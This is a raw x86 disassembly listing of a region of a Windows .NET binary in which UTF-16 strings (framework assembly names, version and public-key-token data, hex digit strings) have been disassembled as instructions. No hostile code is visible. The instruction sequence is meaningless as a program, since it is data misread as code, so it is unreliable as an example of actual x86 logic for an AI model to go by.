  4049eb:	ins    BYTE PTR es:[edi],dx
  4049ec:	add    BYTE PTR [edi+0x0],ch
  4049ef:	ja     0x4049f1
  4049f1:	sub    al,0x0
  4049f3:	and    BYTE PTR [eax],al
  4049f5:	push   esi
  4049f6:	add    BYTE PTR [ebp+0x0],ah
  4049f9:	jb     0x4049fb
  4049fb:	jae    0x4049fd
  4049fd:	imul   eax,DWORD PTR [eax],0x6e006f
  404a03:	cmp    eax,0x2e003400
  404a08:	add    BYTE PTR [eax],dh
  404a0a:	add    BYTE PTR [esi],ch
  404a0c:	add    BYTE PTR [eax],dh
  404a0e:	add    BYTE PTR [esi],ch
  404a10:	add    BYTE PTR [eax],dh
  404a12:	add    BYTE PTR [eax+eax*1],ch
  404a15:	and    BYTE PTR [eax],al
  404a17:	inc    ebx
  404a18:	add    BYTE PTR [ebp+0x0],dh
  404a1b:	ins    BYTE PTR es:[edi],dx
  404a1c:	add    BYTE PTR [eax+eax*1+0x75],dh
  404a20:	add    BYTE PTR [edx+0x0],dh
  404a23:	add    BYTE PTR gs:0x65006e00,bh
  404a2a:	add    BYTE PTR [ebp+0x0],dh
  404a2d:	je     0x404a2f
  404a2f:	jb     0x404a31
  404a31:	popa   
  404a32:	add    BYTE PTR [eax+eax*1+0x2c],ch
  404a36:	add    BYTE PTR [eax],ah
  404a38:	add    BYTE PTR [eax+0x0],dl
  404a3b:	jne    0x404a3d
  404a3d:	bound  eax,QWORD PTR [eax]
  404a3f:	ins    BYTE PTR es:[edi],dx
  404a40:	add    BYTE PTR [ecx+0x0],ch
  404a43:	arpl   WORD PTR [eax],ax
  404a45:	dec    ebx
  404a46:	add    BYTE PTR [ebp+0x0],ah
  404a49:	jns    0x404a4b
  404a4b:	push   esp
  404a4c:	add    BYTE PTR [edi+0x0],ch
  404a4f:	imul   eax,DWORD PTR [eax],0x65
  404a52:	add    BYTE PTR [esi+0x0],ch
  404a55:	cmp    eax,0x37006200
  404a5a:	add    BYTE PTR [edi],dh
  404a5c:	add    BYTE PTR [ecx+0x0],ah
  404a5f:	xor    eax,0x35006300
  404a64:	add    BYTE PTR [esi],dh
  404a66:	add    BYTE PTR [ecx],dh
  404a68:	add    BYTE PTR [ecx],bh
  404a6a:	add    BYTE PTR [ebx],dh
  404a6c:	add    BYTE PTR [eax+eax*1],dh
  404a6f:	add    BYTE PTR gs:[eax],dh
  404a72:	add    BYTE PTR [eax],bh
  404a74:	add    BYTE PTR [ecx],bh
  404a76:	add    BYTE PTR [eax+0x790053ae],al
  404a7c:	add    BYTE PTR [ebx+0x0],dh
  404a7f:	je     0x404a81
  404a81:	add    BYTE PTR gs:[ebp+0x0],ch
  404a85:	add    BYTE PTR cs:[edi+0x0],dl
  404a89:	imul   eax,DWORD PTR [eax],0x64006e
  404a8f:	outs   dx,DWORD PTR ds:[esi]
  404a90:	add    BYTE PTR [edi+0x0],dh
  404a93:	jae    0x404a95
  404a95:	add    BYTE PTR cs:[esi+0x0],al
  404a99:	outs   dx,DWORD PTR ds:[esi]
  404a9a:	add    BYTE PTR [edx+0x0],dh
  404a9d:	ins    DWORD PTR es:[edi],dx
  404a9e:	add    BYTE PTR [ebx+0x0],dh
  404aa1:	sub    al,0x0
  404aa3:	and    BYTE PTR [eax],al
  404aa5:	push   esi
  404aa6:	add    BYTE PTR [ebp+0x0],ah
  404aa9:	jb     0x404aab
  404aab:	jae    0x404aad
  404aad:	imul   eax,DWORD PTR [eax],0x6e006f
  404ab3:	cmp    eax,0x2e003400
  404ab8:	add    BYTE PTR [eax],dh
  404aba:	add    BYTE PTR [esi],ch
  404abc:	add    BYTE PTR [eax],dh
  404abe:	add    BYTE PTR [esi],ch
  404ac0:	add    BYTE PTR [eax],dh
  404ac2:	add    BYTE PTR [eax+eax*1],ch
  404ac5:	and    BYTE PTR [eax],al
  404ac7:	inc    ebx
  404ac8:	add    BYTE PTR [ebp+0x0],dh
  404acb:	ins    BYTE PTR es:[edi],dx
  404acc:	add    BYTE PTR [eax+eax*1+0x75],dh
  404ad0:	add    BYTE PTR [edx+0x0],dh
  404ad3:	add    BYTE PTR gs:0x65006e00,bh
  404ada:	add    BYTE PTR [ebp+0x0],dh
  404add:	je     0x404adf
  404adf:	jb     0x404ae1
  404ae1:	popa   
  404ae2:	add    BYTE PTR [eax+eax*1+0x2c],ch
  404ae6:	add    BYTE PTR [eax],ah
  404ae8:	add    BYTE PTR [eax+0x0],dl
  404aeb:	jne    0x404aed
  404aed:	bound  eax,QWORD PTR [eax]
  404aef:	ins    BYTE PTR es:[edi],dx
  404af0:	add    BYTE PTR [ecx+0x0],ch
  404af3:	arpl   WORD PTR [eax],ax
  404af5:	dec    ebx
  404af6:	add    BYTE PTR [ebp+0x0],ah
  404af9:	jns    0x404afb
  404afb:	push   esp
  404afc:	add    BYTE PTR [edi+0x0],ch
  404aff:	imul   eax,DWORD PTR [eax],0x65
  404b02:	add    BYTE PTR [esi+0x0],ch
  404b05:	cmp    eax,0x37006200
  404b0a:	add    BYTE PTR [edi],dh
  404b0c:	add    BYTE PTR [ecx+0x0],ah
  404b0f:	xor    eax,0x35006300
  404b14:	add    BYTE PTR [esi],dh
  404b16:	add    BYTE PTR [ecx],dh
  404b18:	add    BYTE PTR [ecx],bh
  404b1a:	add    BYTE PTR [ebx],dh
  404b1c:	add    BYTE PTR [eax+eax*1],dh
  404b1f:	add    BYTE PTR gs:[eax],dh
  404b22:	add    BYTE PTR [eax],bh
  404b24:	add    BYTE PTR [ecx],bh
  404b26:	add    BYTE PTR [eax+0x7900539a],al
  404b2c:	add    BYTE PTR [ebx+0x0],dh
  404b2f:	je     0x404b31
  404b31:	add    BYTE PTR gs:[ebp+0x0],ch
  404b35:	add    BYTE PTR cs:[eax+0x0],bl
  404b39:	ins    DWORD PTR es:[edi],dx
  404b3a:	add    BYTE PTR [eax+eax*1+0x2c],ch
  404b3e:	add    BYTE PTR [eax],ah
  404b40:	add    BYTE PTR [esi+0x0],dl
  404b43:	add    BYTE PTR gs:[edx+0x0],dh
  404b47:	jae    0x404b49
  404b49:	imul   eax,DWORD PTR [eax],0x6e006f
  404b4f:	cmp    eax,0x2e003400
  404b54:	add    BYTE PTR [eax],dh
  404b56:	add    BYTE PTR [esi],ch
  404b58:	add    BYTE PTR [eax],dh
  404b5a:	add    BYTE PTR [esi],ch
  404b5c:	add    BYTE PTR [eax],dh
  404b5e:	add    BYTE PTR [eax+eax*1],ch
  404b61:	and    BYTE PTR [eax],al
  404b63:	inc    ebx
  404b64:	add    BYTE PTR [ebp+0x0],dh
  404b67:	ins    BYTE PTR es:[edi],dx
  404b68:	add    BYTE PTR [eax+eax*1+0x75],dh
  404b6c:	add    BYTE PTR [edx+0x0],dh
  404b6f:	add    BYTE PTR gs:0x65006e00,bh
  404b76:	add    BYTE PTR [ebp+0x0],dh
  404b79:	je     0x404b7b
  404b7b:	jb     0x404b7d
  404b7d:	popa   
  404b7e:	add    BYTE PTR [eax+eax*1+0x2c],ch
  404b82:	add    BYTE PTR [eax],ah
  404b84:	add    BYTE PTR [eax+0x0],dl
  404b87:	jne    0x404b89
  404b89:	bound  eax,QWORD PTR [eax]
  404b8b:	ins    BYTE PTR es:[edi],dx
  404b8c:	add    BYTE PTR [ecx+0x0],ch
  404b8f:	arpl   WORD PTR [eax],ax
  404b91:	dec    ebx
  404b92:	add    BYTE PTR [ebp+0x0],ah
  404b95:	jns    0x404b97
  404b97:	push   esp
  404b98:	add    BYTE PTR [edi+0x0],ch
  404b9b:	imul   eax,DWORD PTR [eax],0x65
  404b9e:	add    BYTE PTR [esi+0x0],ch
  404ba1:	cmp    eax,0x37006200
  404ba6:	add    BYTE PTR [edi],dh
  404ba8:	add    BYTE PTR [ecx+0x0],ah
  404bab:	xor    eax,0x35006300
  404bb0:	add    BYTE PTR [esi],dh
  404bb2:	add    BYTE PTR [ecx],dh
  404bb4:	add    BYTE PTR [ecx],bh
  404bb6:	add    BYTE PTR [ebx],dh
  404bb8:	add    BYTE PTR [eax+eax*1],dh
  404bbb:	add    BYTE PTR gs:[eax],dh
  404bbe:	add    BYTE PTR [eax],bh
  404bc0:	add    BYTE PTR [ecx],bh
  404bc2:	add    BYTE PTR [eax],ah
  404bc4:	bound  eax,QWORD PTR [eax]
  404bc6:	xor    BYTE PTR [eax],al
  404bc8:	xor    eax,DWORD PTR [eax]
  404bca:	data16 add BYTE PTR ds:0x37006600,dh
  404bd1:	add    BYTE PTR [esi+0x0],ah
  404bd4:	xor    DWORD PTR [eax],eax
  404bd6:	xor    DWORD PTR [eax],eax
  404bd8:	add    BYTE PTR fs:0x61003000,dh
  404bdf:	add    BYTE PTR [ebx],dh
  404be1:	add    BYTE PTR [ecx+0x0],ah
  404be4:	add    BYTE PTR [eax+0x300030],0x32
  404beb:	add    BYTE PTR [eax+eax*1],dh
  404bee:	xor    BYTE PTR [eax],al
  404bf0:	xor    BYTE PTR [eax],al
  404bf2:	xor    BYTE PTR [eax],al
  404bf4:	xor    BYTE PTR [eax],al
  404bf6:	xor    BYTE PTR [eax],al
  404bf8:	xor    al,0x0
  404bfa:	cmp    BYTE PTR [eax],al
  404bfc:	xor    BYTE PTR [eax],al
  404bfe:	xor    BYTE PTR [eax],al
  404c00:	xor    BYTE PTR [eax],al
  404c02:	xor    BYTE PTR [eax],al
  404c04:	xor    BYTE PTR [eax],al
  404c06:	cmp    DWORD PTR [eax],eax
  404c08:	xor    al,0x0
  404c0a:	xor    BYTE PTR [eax],al
  404c0c:	xor    BYTE PTR [eax],al
  404c0e:	xor    BYTE PTR [eax],al
  404c10:	xor    BYTE PTR [eax],al
  404c12:	xor    BYTE PTR [eax],al
  404c14:	xor    BYTE PTR [eax],al
  404c16:	xor    BYTE PTR [eax],al
  404c18:	add    BYTE PTR ss:[eax],dh
  404c1b:	add    BYTE PTR [edx],dh
  404c1d:	add    BYTE PTR [eax],dh
  404c1f:	add    BYTE PTR [eax],dh
  404c21:	add    BYTE PTR [eax],dh
  404c23:	add    BYTE PTR [eax],dh
  404c25:	add    BYTE PTR [eax],dh
  404c27:	add    BYTE PTR [eax],dh
  404c29:	add    BYTE PTR [edx],dh
  404c2b:	add    BYTE PTR [eax+eax*1],dh
  404c2e:	xor    BYTE PTR [eax],al
  404c30:	xor    BYTE PTR [eax],al
  404c32:	xor    BYTE PTR [eax],al
  404c34:	xor    BYTE PTR [eax],al
  404c36:	xor    eax,0x35003200
  404c3b:	add    BYTE PTR [ebx],dh
  404c3d:	add    BYTE PTR [eax+eax*1],dh
  404c40:	xor    DWORD PTR [eax],eax
  404c42:	xor    eax,DWORD PTR [eax]
  404c44:	xor    DWORD PTR [eax],eax
  404c46:	xor    BYTE PTR [eax],al
  404c48:	xor    BYTE PTR [eax],al
  404c4a:	xor    BYTE PTR [eax],al
  404c4c:	xor    al,0x0
  404c4e:	xor    BYTE PTR [eax],al
  404c50:	xor    BYTE PTR [eax],al
  404c52:	xor    BYTE PTR [eax],al
  404c54:	xor    BYTE PTR [eax],al
  404c56:	xor    BYTE PTR [eax],al
  404c58:	xor    DWORD PTR [eax],eax
  404c5a:	xor    BYTE PTR [eax],al
  404c5c:	xor    BYTE PTR [eax],al
  404c5e:	xor    BYTE PTR [eax],al
  404c60:	xor    DWORD PTR [eax],eax
  404c62:	xor    BYTE PTR [eax],al
  404c64:	xor    BYTE PTR [eax],al
  404c66:	xor    BYTE PTR [eax],al
  404c68:	aaa    
  404c69:	add    BYTE PTR [eax+eax*1+0x31],al
  404c6d:	add    BYTE PTR [esi+0x0],al
  404c70:	inc    ecx
  404c71:	add    BYTE PTR ds:0x43003700,dh
  404c77:	add    BYTE PTR [eax+eax*1],dh
  404c7a:	inc    ecx
  404c7b:	add    BYTE PTR [ebp+0x0],al
  404c7e:	inc    esp
  404c7f:	add    BYTE PTR [ecx],bh
  404c81:	add    BYTE PTR [esi+0x0],al
  404c84:	xor    BYTE PTR [eax],al
  404c86:	inc    ecx
  404c87:	add    BYTE PTR [ebx],dh
  404c89:	add    BYTE PTR [edx],dh
  404c8b:	add    BYTE PTR [ebp+0x0],al
  404c8e:	cmp    BYTE PTR [eax],al
  404c90:	xor    al,0x0
  404c92:	inc    ecx
  404c93:	add    BYTE PTR [ecx+0x0],al
  404c96:	xor    BYTE PTR [eax],al
  404c98:	inc    esi
  404c99:	add    BYTE PTR [ecx+0x0],al
  404c9c:	inc    ebp
  404c9d:	add    BYTE PTR [esi+0x0],al
  404ca0:	inc    esp
  404ca1:	add    BYTE PTR [eax],dh
  404ca3:	add    BYTE PTR [eax+eax*1+0x45],al
  404ca7:	add    BYTE PTR [ecx],bh
  404ca9:	add    BYTE PTR [ebp+0x0],al
  404cac:	cmp    BYTE PTR [eax],al
  404cae:	inc    esi
  404caf:	add    BYTE PTR [eax+eax*1+0x36],al
  404cb3:	add    BYTE PTR [ecx+0x0],al
  404cb6:	inc    ebp
  404cb7:	add    BYTE PTR [ebx+0x0],al
  404cba:	cmp    BYTE PTR [eax],al
  404cbc:	inc    esi
  404cbd:	add    BYTE PTR [eax],bh
  404cbf:	add    BYTE PTR [edi],dh
  404cc1:	add    BYTE PTR [esi+0x0],al
  404cc4:	inc    edx
  404cc5:	add    BYTE PTR [eax],dh
  404cc7:	add    BYTE PTR [ebx],dh
  404cc9:	add    BYTE PTR [edi],dh
  404ccb:	add    BYTE PTR [esi],dh
  404ccd:	add    BYTE PTR [esi],dh
  404ccf:	add    BYTE PTR [ebx+0x0],al
  404cd2:	cmp    BYTE PTR [eax],al
  404cd4:	xor    eax,DWORD PTR [eax]
  404cd6:	xor    al,0x0
  404cd8:	inc    ebx
  404cd9:	add    BYTE PTR [ecx],bh
  404cdb:	add    BYTE PTR [ecx],bh
  404cdd:	add    BYTE PTR [ecx],bh
  404cdf:	add    BYTE PTR [edx],dh
  404ce1:	add    BYTE PTR [ecx],dh
  404ce3:	add    BYTE PTR [ebp+0x0],al
  404ce6:	inc    edx
  404ce7:	add    BYTE PTR [edx],dh
  404ce9:	add    BYTE PTR [ebx],dh
  404ceb:	add    BYTE PTR [edx+0x0],al
  404cee:	inc    ebp
  404cef:	add    BYTE PTR [edi],dh
  404cf1:	add    BYTE PTR [ecx],bh
  404cf3:	add    BYTE PTR [ecx+0x0],al
  404cf6:	inc    esp
  404cf7:	add    BYTE PTR [ecx],bh
  404cf9:	add    BYTE PTR [eax+eax*1+0x35],al
  404cfd:	add    BYTE PTR [eax+eax*1+0x43],al
  404d01:	add    BYTE PTR [ebx+0x0],al
  404d04:	xor    DWORD PTR [eax],eax
  404d06:	inc    esp
  404d07:	add    BYTE PTR [eax+eax*1+0x39],al
  404d0b:	add    BYTE PTR [ecx+0x0],al
  404d0e:	inc    esp
  404d0f:	add    BYTE PTR [edx],dh
  404d11:	add    BYTE PTR [ebx],dh
  404d13:	add    BYTE PTR [esi],dh
  404d15:	add    BYTE PTR [ecx],dh
  404d17:	add    BYTE PTR [ebx],dh
  404d19:	add    BYTE PTR [edx],dh
  404d1b:	add    BYTE PTR [ecx],dh
  404d1d:	add    BYTE PTR [eax],dh
  404d1f:	add    BYTE PTR [edx],dh
  404d21:	add    BYTE PTR [ecx],bh
  404d23:	add    BYTE PTR [eax],dh
  404d25:	add    BYTE PTR [eax],dh
  404d27:	add    BYTE PTR [edx+0x0],al
  404d2a:	aaa    
  404d2b:	add    BYTE PTR [edx],dh
  404d2d:	add    BYTE PTR [ebx],dh
  404d2f:	add    BYTE PTR [ebx+0x0],al
  404d32:	inc    esi
  404d33:	add    BYTE PTR [ecx],bh
  404d35:	add    BYTE PTR [eax],bh
  404d37:	add    BYTE PTR [eax],dh
  404d39:	add    BYTE PTR [ecx],bh
  404d3b:	add    BYTE PTR ds:0x46003700,dh
  404d41:	add    BYTE PTR [ebx+0x0],al
  404d44:	xor    al,0x0
  404d46:	inc    ebp
  404d47:	add    BYTE PTR [ecx],dh
  404d49:	add    BYTE PTR [edi],dh
  404d4b:	add    BYTE PTR [edi],dh
  404d4d:	add    BYTE PTR [ecx],dh
  404d4f:	add    BYTE PTR [eax],dh
  404d51:	add    BYTE PTR [eax],bh
  404d53:	add    BYTE PTR [esi+0x0],al
  404d56:	inc    ebx
  404d57:	add    BYTE PTR [esi],dh
  404d59:	add    BYTE PTR [eax],dh
  404d5b:	add    BYTE PTR [edi],dh
  404d5d:	add    BYTE PTR [edi],dh
  404d5f:	add    BYTE PTR [edi],dh
  404d61:	add    BYTE PTR [eax+eax*1],dh
  404d64:	inc    esi
  404d65:	add    BYTE PTR [edx],dh
  404d67:	add    BYTE PTR [ecx],bh
  404d69:	add    BYTE PTR [ebp+0x0],al
  404d6c:	cmp    BYTE PTR [eax],al
  404d6e:	xor    eax,DWORD PTR [eax]
  404d70:	xor    al,BYTE PTR [eax]
  404d72:	xor    BYTE PTR [eax],al
  404d74:	inc    ebp
  404d75:	add    BYTE PTR [ecx],bh
  404d77:	add    BYTE PTR [edx],dh
  404d79:	add    BYTE PTR [ebp+0x0],al
  404d7c:	inc    ecx
  404d7d:	add    BYTE PTR [eax],dh
  404d7f:	add    BYTE PTR ds:0x43004500,dh
  404d85:	add    BYTE PTR [ebp+0x0],al
  404d88:	xor    al,0x0
  404d8a:	inc    ebp
  404d8b:	add    BYTE PTR [eax],bh
  404d8d:	add    BYTE PTR [edx],dh
  404d8f:	add    BYTE PTR [ecx],dh
  404d91:	add    BYTE PTR [ebx+0x0],al
  404d94:	xor    BYTE PTR [eax],al
  404d96:	inc    ecx
  404d97:	add    BYTE PTR ds:0x46004500,dh
  404d9d:	add    BYTE PTR [ebp+0x0],al
  404da0:	cmp    BYTE PTR [eax],al
  404da2:	inc    esi
  404da3:	add    BYTE PTR [ecx],dh
  404da5:	add    BYTE PTR [esi],dh
  404da7:	add    BYTE PTR [eax+eax*1],dh
  404daa:	xor    eax,0x34004300
  404daf:	add    BYTE PTR [ebx+0x0],al
  404db2:	xor    BYTE PTR [eax],al
  404db4:	inc    ebx
  404db5:	add    BYTE PTR [ecx],bh
  404db7:	add    BYTE PTR [ebx],dh
  404db9:	add    BYTE PTR [ebx+0x0],al
  404dbc:	xor    DWORD PTR [eax],eax
  404dbe:	inc    ecx
  404dbf:	add    BYTE PTR [edx+0x0],al
  404dc2:	cmp    DWORD PTR [eax],eax
  404dc4:	cmp    DWORD PTR [eax],eax
  404dc6:	xor    al,BYTE PTR [eax]
  404dc8:	cmp    BYTE PTR [eax],al
  404dca:	xor    eax,0x36004400
  404dcf:	add    BYTE PTR [edx],dh
  404dd1:	add    BYTE PTR [edx],dh
  404dd3:	add    BYTE PTR [ebx+0x0],al
  404dd6:	inc    ecx
  404dd7:	add    BYTE PTR [ecx+0x0],al
  404dda:	add    BYTE PTR ss:0x43003200,dh
  404de1:	add    BYTE PTR [ecx],dh
  404de3:	add    BYTE PTR [eax+eax*1+0x46],al
  404de7:	add    BYTE PTR [ecx+0x0],al
  404dea:	inc    esp
  404deb:	add    BYTE PTR [esi],dh
  404ded:	add    BYTE PTR [ebx],dh
  404def:	add    BYTE PTR [eax+eax*1+0x37],al
  404df3:	add    BYTE PTR [eax+eax*1],dh
  404df6:	xor    eax,0x36004400
  404dfb:	add    BYTE PTR [esi+0x0],al
  404dfe:	xor    al,BYTE PTR [eax]
  404e00:	inc    esp
  404e01:	add    BYTE PTR [ebp+0x0],al
  404e04:	xor    eax,0x31004600
  404e09:	add    BYTE PTR [edi],dh
  404e0b:	add    BYTE PTR [ebp+0x0],al
  404e0e:	xor    eax,0x41004500
  404e13:	add    BYTE PTR [esi+0x0],al
  404e16:	xor    BYTE PTR [eax],al
  404e18:	inc    esi
  404e19:	add    BYTE PTR [ebx+0x0],al
  404e1c:	xor    al,0x0
  404e1e:	cmp    DWORD PTR [eax],eax
  404e20:	add    BYTE PTR ss:[ebx],dh
  404e23:	add    BYTE PTR [eax+eax*1+0x32],al
  404e27:	add    BYTE PTR [esi],dh
  404e29:	add    BYTE PTR [ecx],dh
  404e2b:	add    BYTE PTR [ebx+0x0],al
  404e2e:	cmp    BYTE PTR [eax],al
  404e30:	inc    ecx
  404e31:	add    BYTE PTR [ecx],dh
  404e33:	add    BYTE PTR [edx],dh
  404e35:	add    BYTE PTR [eax+eax*1],dh
  404e38:	xor    eax,DWORD PTR [eax]
  404e3a:	add    BYTE PTR ss:0x38003100,dh
  404e41:	add    BYTE PTR [edx],dh
  404e43:	add    BYTE PTR [eax],dh
  404e45:	add    BYTE PTR [esi],dh
  404e47:	add    BYTE PTR [eax+eax*1+0x43],al
  404e4b:	add    BYTE PTR [eax],dh
  404e4d:	add    BYTE PTR [ecx],bh
  404e4f:	add    BYTE PTR [ebx],dh
  404e51:	add    BYTE PTR [ebx],dh
  404e53:	add    BYTE PTR [eax+eax*1],dh
  404e56:	xor    al,0x0
  404e58:	inc    esp
  404e59:	add    BYTE PTR ds:0x44004100,dh
  404e5f:	add    BYTE PTR [edx],dh
  404e61:	add    BYTE PTR [ecx],bh
  404e63:	add    BYTE PTR [ebx],dh
  404e65:	add    BYTE PTR [eax+0x790053d0],al
  404e6b:	add    BYTE PTR [ebx+0x0],dh
  404e6e:	je     0x404e70
  404e70:	add    BYTE PTR gs:[ebp+0x0],ch
  404e74:	add    BYTE PTR cs:[ebx+0x0],al
  404e78:	outs   dx,DWORD PTR ds:[esi]
  404e79:	add    BYTE PTR [ebp+0x0],ch
  404e7c:	jo     0x404e7e
  404e7e:	outs   dx,DWORD PTR ds:[esi]
  404e7f:	add    BYTE PTR [esi+0x0],ch
  404e82:	add    BYTE PTR gs:[esi+0x0],ch
  404e86:	je     0x404e88
  404e88:	dec    ebp
  404e89:	add    BYTE PTR [edi+0x0],ch
  404e8c:	add    BYTE PTR fs:[ebp+0x0],ah
  404e90:	ins    BYTE PTR es:[edi],dx
  404e91:	add    BYTE PTR [esi],ch
  404e93:	add    BYTE PTR [eax+eax*1+0x61],al
  404e97:	add    BYTE PTR [eax+eax*1+0x61],dh
  404e9b:	add    BYTE PTR [ecx+0x0],al
  404e9e:	outs   dx,BYTE PTR ds:[esi]
  404e9f:	add    BYTE PTR [esi+0x0],ch
  404ea2:	outs   dx,DWORD PTR ds:[esi]
  404ea3:	add    BYTE PTR [eax+eax*1+0x61],dh
  404ea7:	add    BYTE PTR [eax+eax*1+0x69],dh
  404eab:	add    BYTE PTR [edi+0x0],ch
  404eae:	outs   dx,BYTE PTR ds:[esi]
  404eaf:	add    BYTE PTR [ebx+0x0],dh
  404eb2:	sub    al,0x0
  404eb4:	and    BYTE PTR [eax],al
  404eb6:	push   esi
  404eb7:	add    BYTE PTR [ebp+0x0],ah
  404eba:	jb     0x404ebc
  404ebc:	jae    0x404ebe
  404ebe:	imul   eax,DWORD PTR [eax],0x6e006f
  404ec4:	cmp    eax,0x2e003400
  404ec9:	add    BYTE PTR [eax],dh
  404ecb:	add    BYTE PTR [esi],ch
  404ecd:	add    BYTE PTR [eax],dh
  404ecf:	add    BYTE PTR [esi],ch
  404ed1:	add    BYTE PTR [eax],dh
  404ed3:	add    BYTE PTR [eax+eax*1],ch
  404ed6:	and    BYTE PTR [eax],al
  404ed8:	inc    ebx
  404ed9:	add    BYTE PTR [ebp+0x0],dh
  404edc:	ins    BYTE PTR es:[edi],dx
  404edd:	add    BYTE PTR [eax+eax*1+0x75],dh
  404ee1:	add    BYTE PTR [edx+0x0],dh
  404ee4:	add    BYTE PTR gs:0x65006e00,bh
  404eeb:	add    BYTE PTR [ebp+0x0],dh
  404eee:	je     0x404ef0
  404ef0:	jb     0x404ef2
  404ef2:	popa   
  404ef3:	add    BYTE PTR [eax+eax*1+0x2c],ch
  404ef7:	add    BYTE PTR [eax],ah
  404ef9:	add    BYTE PTR [eax+0x0],dl
  404efc:	jne    0x404efe
  404efe:	bound  eax,QWORD PTR [eax]
  404f00:	ins    BYTE PTR es:[edi],dx
  404f01:	add    BYTE PTR [ecx+0x0],ch
  404f04:	arpl   WORD PTR [eax],ax
  404f06:	dec    ebx
  404f07:	add    BYTE PTR [ebp+0x0],ah
  404f0a:	jns    0x404f0c
  404f0c:	push   esp
  404f0d:	add    BYTE PTR [edi+0x0],ch
  404f10:	imul   eax,DWORD PTR [eax],0x65
  404f13:	add    BYTE PTR [esi+0x0],ch
  404f16:	cmp    eax,0x31003300
  404f1b:	add    BYTE PTR [edx+0x0],ah
  404f1e:	data16 add BYTE PTR [ebx],dh
  404f21:	add    BYTE PTR [eax],bh
  404f23:	add    BYTE PTR ds:0x61003600,dh
  404f29:	add    BYTE PTR [eax+eax*1+0x33],ah
  404f2d:	add    BYTE PTR [esi],dh
  404f2f:	add    BYTE PTR [eax+eax*1],dh
  404f32:	add    BYTE PTR gs:[ebx],dh
  404f35:	add    BYTE PTR ds:0x53ae8000,dh
  404f3b:	add    BYTE PTR [ecx+0x0],bh
  404f3e:	jae    0x404f40
  404f40:	je     0x404f42
  404f42:	add    BYTE PTR gs:[ebp+0x0],ch
  404f46:	add    BYTE PTR cs:[ebx+0x0],al
  404f4a:	outs   dx,DWORD PTR ds:[esi]
  404f4b:	add    BYTE PTR [esi+0x0],ch
  404f4e:	data16 add BYTE PTR [ecx+0x0],ch
  404f52:	add    BYTE PTR [di+0x0],dh
  404f56:	jb     0x404f58
  404f58:	popa   
  404f59:	add    BYTE PTR [eax+eax*1+0x69],dh
  404f5d:	add    BYTE PTR [edi+0x0],ch
  404f60:	outs   dx,BYTE PTR ds:[esi]
  404f61:	add    BYTE PTR [eax+eax*1],ch
  404f64:	and    BYTE PTR [eax],al
  404f66:	push   esi
  404f67:	add    BYTE PTR [ebp+0x0],ah
  404f6a:	jb     0x404f6c
  404f6c:	jae    0x404f6e
  404f6e:	imul   eax,DWORD PTR [eax],0x6e006f
  404f74:	cmp    eax,0x2e003400
  404f79:	add    BYTE PTR [eax],dh
  404f7b:	add    BYTE PTR [esi],ch
  404f7d:	add    BYTE PTR [eax],dh
  404f7f:	add    BYTE PTR [esi],ch
  404f81:	add    BYTE PTR [eax],dh
  404f83:	add    BYTE PTR [eax+eax*1],ch
  404f86:	and    BYTE PTR [eax],al
  404f88:	inc    ebx
  404f89:	add    BYTE PTR [ebp+0x0],dh
  404f8c:	ins    BYTE PTR es:[edi],dx
  404f8d:	add    BYTE PTR [eax+eax*1+0x75],dh
  404f91:	add    BYTE PTR [edx+0x0],dh
  404f94:	add    BYTE PTR gs:0x65006e00,bh
  404f9b:	add    BYTE PTR [ebp+0x0],dh
  404f9e:	je     0x404fa0
  404fa0:	jb     0x404fa2
  404fa2:	popa   
  404fa3:	add    BYTE PTR [eax+eax*1+0x2c],ch
  404fa7:	add    BYTE PTR [eax],ah
  404fa9:	add    BYTE PTR [eax+0x0],dl
  404fac:	jne    0x404fae
  404fae:	bound  eax,QWORD PTR [eax]
  404fb0:	ins    BYTE PTR es:[edi],dx
  404fb1:	add    BYTE PTR [ecx+0x0],ch
  404fb4:	arpl   WORD PTR [eax],ax
  404fb6:	dec    ebx
  404fb7:	add    BYTE PTR [ebp+0x0],ah
  404fba:	jns    0x404fbc
  404fbc:	push   esp
  404fbd:	add    BYTE PTR [edi+0x0],ch
  404fc0:	imul   eax,DWORD PTR [eax],0x65
  404fc3:	add    BYTE PTR [esi+0x0],ch
  404fc6:	cmp    eax,0x30006200
  404fcb:	add    BYTE PTR [ebx],dh
  404fcd:	add    BYTE PTR [esi+0x0],ah
  404fd0:	xor    eax,0x37006600
  404fd5:	add    BYTE PTR [esi+0x0],ah
  404fd8:	xor    DWORD PTR [eax],eax
  404fda:	xor    DWORD PTR [eax],eax
  404fdc:	add    BYTE PTR fs:0x61003000,dh
  404fe3:	add    BYTE PTR [ebx],dh
  404fe5:	add    BYTE PTR [ecx+0x0],ah
  404fe8:	cmp    BYTE PTR [esi+0x790053],0x73
  404fef:	add    BYTE PTR [eax+eax*1+0x65],dh
  404ff3:	add    BYTE PTR [ebp+0x0],ch
  404ff6:	add    BYTE PTR cs:[ebx+0x0],al
  404ffa:	outs   dx,DWORD PTR ds:[esi]
  404ffb:	add    BYTE PTR [esi+0x0],ch
  404ffe:	data16 add BYTE PTR [ecx+0x0],ch
  405002:	add    BYTE PTR [di+0x0],dh
  405006:	jb     0x405008
  405008:	popa   
  405009:	add    BYTE PTR [eax+eax*1+0x69],dh
  40500d:	add    BYTE PTR [edi+0x0],ch
  405010:	outs   dx,BYTE PTR ds:[esi]
  405011:	add    BYTE PTR [esi],ch
  405013:	add    BYTE PTR [ecx+0x0],cl
  405016:	outs   dx,BYTE PTR ds:[esi]
  405017:	add    BYTE PTR [ebx+0x0],dh
  40501a:	je     0x40501c
  40501c:	popa   
  40501d:	add    BYTE PTR [eax+eax*1+0x6c],ch
  405021:	add    BYTE PTR [eax+eax*1],ch
  405024:	and    BYTE PTR [eax],al
  405026:	push   esi
  405027:	add    BYTE PTR [ebp+0x0],ah
  40502a:	jb     0x40502c
  40502c:	jae    0x40502e
  40502e:	imul   eax,DWORD PTR [eax],0x6e006f
  405034:	cmp    eax,0x2e003400
  405039:	add    BYTE PTR [eax],dh
  40503b:	add    BYTE PTR [esi],ch
  40503d:	add    BYTE PTR [eax],dh
  40503f:	add    BYTE PTR [esi],ch
  405041:	add    BYTE PTR [eax],dh
  405043:	add    BYTE PTR [eax+eax*1],ch
  405046:	and    BYTE PTR [eax],al
  405048:	inc    ebx
  405049:	add    BYTE PTR [ebp+0x0],dh
  40504c:	ins    BYTE PTR es:[edi],dx
  40504d:	add    BYTE PTR [eax+eax*1+0x75],dh
  405051:	add    BYTE PTR [edx+0x0],dh
  405054:	add    BYTE PTR gs:0x65006e00,bh
  40505b:	add    BYTE PTR [ebp+0x0],dh
  40505e:	je     0x405060
  405060:	jb     0x405062
  405062:	popa   
